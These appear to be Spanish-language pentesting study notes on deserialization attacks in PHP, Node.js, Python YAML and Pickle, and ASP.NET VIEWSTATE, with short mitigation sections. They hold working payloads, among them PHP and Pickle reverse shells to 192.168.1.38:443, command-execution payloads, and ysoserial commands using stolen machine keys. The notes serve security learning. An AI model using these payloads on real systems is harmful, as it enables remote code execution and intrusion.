# ¿ Que es la **serialización** ? 

La **serialización** es el proceso de cvonvertir un objeto en una secuencia de **bytes** que puede ser almacenada o transmitida a través de una red. La **deserialización** es el proceso inverso, en el que una secuencia de bytes es convertida de nuevo a un objeto. 

----
# ¿ Que es un **ataque de deserialización** ?

Los **ataques de deserialización** son un tipo de ataque que aprovecha las vulnerabilidades en los procesos de **serialización** y **deserialización** de objetos en aplicaciones que utilizan la programacón orientada a objetos (**POO**)

Estos ataques ocurren cuando un atacante puede manipular los datos que se están deserializando, lo que puede llevar a [[RCE - (Remote Command Execution)]] en el servidor. 

Los **ataques de deserialización** pueden ocurrir en diferentes tipos de aplicaciones, incluyendo aplicaciones web, aplicaciones móviles y aplicaciones de escritorio. Estos ataques pueden ser explotados de varias maneras como: 

- Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso. 
- Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso.
- Realizar un ataque de **man-in-the-middle** para interceptar y modificar el objeto serializado antes de que llegue a la aplicación. 

------------
# Evitar estos ataques 

Para evitar estos tipos de ataques, es importante que las aplicaciones validen y autentiquen adecuadamente todos los datos que reciben antes de deserializarlos. También es importante utilizar bibliotecas de serialización y deserializaciópn seguras y actualizar regularmente todas las bibliotecas y componentes de la aplicación para correfir posibles vulnerabilidades. 

----

# PHP Deserialization attack
Estos ataques se pueden aconteser en muchos escenarios, por ejemplo, en aplicaciones web que tratan con NodeJS o PHP, por ejemplo, si detectaramos que la data interceptada con [[Burpsuite]] viaja de una manera serializada, podriamos comenzar a pensar en un **php deserilialisation attack**. 

La data interceptara por ejemplo se ve así:  `obj=O:8:"pingTest":1:{s:9:"ipAddress";s:9:"284781274";}&ip=284781274`

Y sabemos que por detras el código es el sig: 

```php
<?php
class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";
	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
			{
				$this->isValid = True;
			}
		}
		$this->ping();
	}
	public function ping()
        {
		if ($this->isValid) {
			$this->output = shell_exec("ping -c 3 $this->ipAddress");	
		}
        }
}
if (isset($_POST['obj'])) {
	$pingTest = unserialize(urldecode($_POST['obj']));
} else {
	$pingTest = new pingTest;
}
$pingTest->validate();
```

Donde, tras analizar el código, podriamos pensar en que si lograramos hacer que el valor de ipAddress sea un comando de bash a la par que isValid sea True, estariamos con la posibilidad de inyectar comandos en el sistema a traves de un **Deserialization attack**. 

Podriamos crear un script de php imitando la funcionalidad del código que pudimos ver, para de esta manera recrear un **nuevo** objeto **serializado**.

```php
<?php 

class pingTest {
	public $ipadress = "; bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'";
	public $isValid = True; 
	public $output = ""; 
}

echo serialize(new pingTest);
```

Logrando así, obtener un obj serializado válido el cual nos envía una reverse shell, teniendo así, posiblidad de [[RCE - (Remote Command Execution)]]. 

##### `O:8:"pingTest":3:{s:9:"ipAddress";s:53:"; bash -c 'bash -i >& /dev/tcp/192.168.1.38/443 0>&1'";s:7:"isValid";b:1;s:6:"output";s:0:"";}`

----
#  Nodejs Deserialization attack (unserialize)

Ahora, en un escenario de un **node deserialization attack** podriamos hacer uso del concepto **IIFE (Inmediatly Invoked Function Exression)**, el cual consiste en la declaración de funciones que son ejecutadas en el mismo momento de la declaración, de manera que, si capturaramos por ejemplo, una cookie la cual es `eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=`, al decodearle veriamos la sig data serializada: 

`{"username":"dobliuw","country":"india","city":"bangalore"}`, mientras que en la web vemos un "Hello dobliuw", podemos deducir que si cambiamos esta data serializada, para que en lugar de donde dice "dobliuw" diga otra cosa que ingresemos nosotros, podrimaos intentar hacer uso de un **IIFE** para que a la hora de que se deserialize dicha data, se ejecute una instrucción de [[RCE - (Remote Command Execution)]]. 

```javascript
const serialize = require('node-serialize'); 

const payload = {
username: function(){require('child_process').exec('whoami', (err, stdout, stderr) => stdout ? console.log(stdout) : null)},
country: "Argentina",
city: "Buenos Aires"
}

console.log(serialize.serialize(payload))
```

Esta función, que se encarga de serializar el payload, nos arrojaria lo sig: 

`{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) => stdout ? console.log(stdout) : null)}","country":"Argentina","city":"Buenos Aires"}`

De manera que nuestra función `_$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) => stdout ? console.log(stdout) : null)}` devera ser invocada indemediatamente agregado `()` alfinal de esta, 

**IIFE**: `_$$ND_FUNC$$_function(){require('child_process').exec('whoami', (err, stdout, stderr) => stdout ? console.log(stdout) : null)}()` 

De esta manera, cuando el servidor deserialize la data, gracias a nuestra **IIFE**, se ejecutara el comando del lado del servidor, dejandonos así posiblidad de [[RCE - (Remote Command Execution)]]. 

----
# YAML deserialization attack (Python)

Un **ataque de Deserialización Yaml (DES-Yaml)** es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan **YAML (Yet Another Markup Language)** para serializar y deserializar objetos. 

La vulnerabilidad se produce cuando un atacantes es capaz de controlar la entrada YAML que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada YAML, puede permitir que un atacante inyecte código malicioso en el objeto deserializado. 

###### Explotation
Para explotar un ataque de deserialización cuando reconocemos que esta yaml corriendo por detrás, es importante que, como siempre, hay que tener en cuenta en caso, esto puede ser muy fácil así como difícil dependiendo la sanitización de la aplicación web, entre otros factores. 
Existen páginas como [esta](https://www.pkmurphy.com.au/isityaml/) en las cuales enseñan como se podría llegar a ejecutar comandos a través de un ataque de deserialización YAML.  

Por ejemplo, si tenemos una aplicación la cual corre python y vemos que se nos redirige a una url tal que así: 

`..../eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWN0aW9uLCB1cGRhdGVzIGNvbWluZyBzb29uIQ==`

Podemos intuir que es una cadena en base64, por lo que si la decodeamos: 

```bash
echo -n "eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWN0aW9uLCB1cGRhdGVzIGNvbWluZyBzb29uIQ==" | base64 -d; echo
```

Veríamos el output: `yaml: The information page is still under construction, updates coming soon!`, intuyendo así que por detrás corre YAML. Usando la página previamente mencionada veríamos que para intentar ejecutar comandos en un aplicativo que deserializa información yaml sin validaciones con el payload `!!python/object/apply:subprocess.check_output ['<command_to_execute>']`.

Pudiendo así ejecutar comandos a través de la explotación de la deserialización YAML en python haciendo lo siguiente: 

```bash
echo -n "yaml: !!python/object/apply:subprocess.check_output ['id']" | base64 -w 0; echo 
```

Y pegando la cadena de base64 como URL podríamos lograr un [[RCE - (Remote Command Execution)]]. 

----
# Pickle deserialization attack (Python)

Un **ataque de deserialización Pickle (DES-Pickle)** es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan la biblioteca Pickle para serializar y deserializar objetos. 

La vulnerabilidad se produce cuando un atacante es capaz de controlar la entrada Pickle que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada Pickle, puede permitir que un atacante inyecte código maliciosos en el objeto deserializado. 

###### Explotation
Supongamos que tenemos una app la cual recibe una cadena hexadecimal en un objeto serializado con Pickle, la convierte a texto legible y la guarda en un archivo sin ningún tipo de validación. 

En el proceso de deserialización, en Pickle, hay una función llamada **__reduce__** la cual podemos controlar para que a la hora de deserializar una data, podemos ingresar a nivel de sistema como queremos que se deserialize o como queremos que se ejecute. Por lo que a la hora de realizar un ataque de deserialización en Pickle mayormente crearíamos un archivo tal que así: 

```python
import pickle, os, binascii 
# binascii para poder convertir la cadena a hexadecimal.

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/192.168.1.38/443 0>&1"',))

if __name__ == "__main__": 
    print(binascii.hexlify(pickle.dumps(Exploit())))
```

Creamos una clase con la función **__reduce__** la cual retorna lo que nos interesa que devuelva, en este caso la ejecución de un comando a nivel de sistema. Para posteriormente pesarle a la función **pickle.dumps()** para mostrar por consola la data serializada (El comando a ejecutar a nivel de sistema). 

-----
# VIEWSTATE in IIS

Podemos obtener la explotación en la de deserialización en aplicaciones **ASP.NET** a través del campo **VIEWSTATE**, campo oculto utilizado por ASP.NET para mantener el estado de la página entre solicitudes puede ser firmado y/o encriptado para evitar manipulación, pero en poseción de las claves o con una mala configuración podría ser explotado.

###### web.config
En algunos casos, los archivos de configuración (como `web.config`) pueden estar expuestos y accesibles, ya sea por malas configuraciones u otras vulnerabilidades como [[LFI - (Local File Inclusion)]]. Estos archivos pueden encontrarse en la raíz del sistema por defecto, pero también podrían tener una localización diferente, por lo que probar distintas rutas conocidas será necesario.

Este archivo alojará las claves de validación y cifrado utilizadas por la aplicación ASP.NET. Estas claves son esenciales si el campo **VIEWSTATE** está configurado para ser firmado o encriptado. 

Ejemplo de archivo *web.config*:

```xml
<configuration>
	<system.web>
		......
		......
		<machineKey decryption="AES"
decryptionKey="74477CEBDD09D66AD4A8C8B5002A4CF....."
validation="SHA1"
validationKey="56200D3D029F914F4CDF25869D24EC2DA51174....." />
	</system.web>
		<system.webServer>
			.......
			.......
		</system.webServer>
</configuration>
```

###### ysoserial.net
Como sabemos, [ysoserial.net](https://github.com/pwntester/ysoserial.net) es una herramienta para generar payloads y explotar vulnerabilidades en aplicaciones .NET (Object deserialization). Una vez con el contenido del archivo *web.config* o con la información necesaria del mismo (Claves y Validactiones) y descargado el repositorio de ysoserial con una terminal abierta en el mismo, podríamos proseguir con la creación del payload.

- Validar los plugins posibles a utilizar:
```bash
ysoserial.exe -p --help
```

- Listar ejemplos para el uso del plugin *ViewState*:
```bash
ysoserial.exe -p ViewState --examples
```

- Crear payload para acontecer [[RCE - (Remote Command Execution)]] basado en la información del archivo *web.config*: 
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "{Command 2 execute}" --path="/path/where/is/the/petition/with/viewstate" --apppath="/path/to/the/asp/app" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66AD4A8C8B5002A4CF....." --validationalg="SHA1" --validationkey="56200D3D029F914F4CDF25869D24EC2DA51174...."
```

El resultado del último comando será un payload en base64 el cual nos permitirá remplazar el contenido original del campo *VIEWSTATE* y en caso de que todo salga bien, lograríamos la ejecución de comandos exitosamente habiendo abusado de una vulnerabilidad en la deserialización de este campo. Podríamos usar páginas webs como [revshells](https://www.revshells.com/) las cuales nos permiten crear one-liners para la obtención de reverse shells o bindshells a través de la ejecución de comandos en múltiples terminales o tecnologías.

###### Mitigation with `web.config`

```xml
<system.web>
    <machineKey validationKey="AutoGenerate,IsolateApps" decryptionKey="AutoGenerate,IsolateApps" validation="SHA1" decryption="AES" />
    <pages enableViewState="true" viewStateEncryptionMode="Always" />
</system.web>
```
